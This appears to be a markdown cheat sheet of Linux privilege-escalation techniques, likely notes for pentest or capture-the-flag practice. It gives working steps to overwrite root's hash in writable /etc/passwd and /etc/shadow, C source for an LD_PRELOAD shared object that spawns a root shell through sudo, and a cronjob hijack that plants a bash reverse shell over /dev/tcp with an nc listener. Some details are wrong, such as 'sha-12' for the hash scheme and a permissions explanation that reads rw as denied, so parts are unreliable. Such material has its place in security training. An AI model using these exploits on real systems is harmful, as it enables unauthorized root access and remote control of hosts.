### File Permissions
```bash
## r=Readable w=Writable x=Executable -=Denied

## Example:
$ ls -l file
   -rw-r--r-- 1 root root 
## Owner of file (rw-), Group (r--) Other(r--)
## Owner = read/write denied, group = read denied denied, other = read denied denied
```
#### /etc/passwd/
```bash
ls -la /etc/passwd
    -rw-r--rw- 1 root root 1561 Sep 26 05:39 /etc/passwd
## above shows owner has rw, group has read and other has rw. Only root should be able to rw. We can use openssl to add a new user.

openssl passwd P@55word
## the characters that generated from above cmd should be add to the /etc/passwd file. replace the 'x' on the root user to try log in as root.
su root
```
### /etc/shadow
```bash
## Same deal as the /etc/passwd file. Not good security if we have rw to this file. Example:
ls -la /etc/shadow
	    -rw-r--rw- 1 root root 1034 Sep 26 05:39 /etc/shaodw
## Cat the file and use hash identifier to see what encryption method is used for the root passwd. if hash starts with $6$ encryption = sha-12

mkpasswd -m sha-12 p@S5w0rd
## copy output and replace the root encryption found in /etc/shadow
sudo su

```
### sudo -l
```bash
## run sudo -l to see if you have access to run any binaires as sudo.
sudo -l 
## if anything returns in the output, go to GTFObin to find a way to exploit.
```
### env_keep+=LD_PRELOAD
```bash
## If you see env_keep+=LD_PRELOAD when you execite sudo -l you could priv esc to root this way. create a the following C file:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

## save to shell.c
## Compile and run the file
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
## once compiled, run it.
sudo LD_PRELOAD=/tmp/shell.so vim
## notice the last part of the cmd says vim. You must include a binary that you have sudo access to (sudo -l)
```

## Cronjobs
```bash
## View all cronjobs
cat /etc/crontab
## go to https://crontab.guru/ to find out time itervals example: * * * * *  = task runs every minute.
## use find command to search for the file with the cronjob assigned to it. CD to file and check permissions.
ls -la 
## add a bash rev shell to the file (pentestmonkey). If its a .sh file executing you have to change the start of the file from #! /bin/sh to #! /bin/bash. 

#! /bin/bash

bash -i >& /dev/tcp/0.0.0.0/4444 0>&1

## Save the file and start nc listener on port 4444 on local host
## wait for crobjob to run to connect back to your local host
```
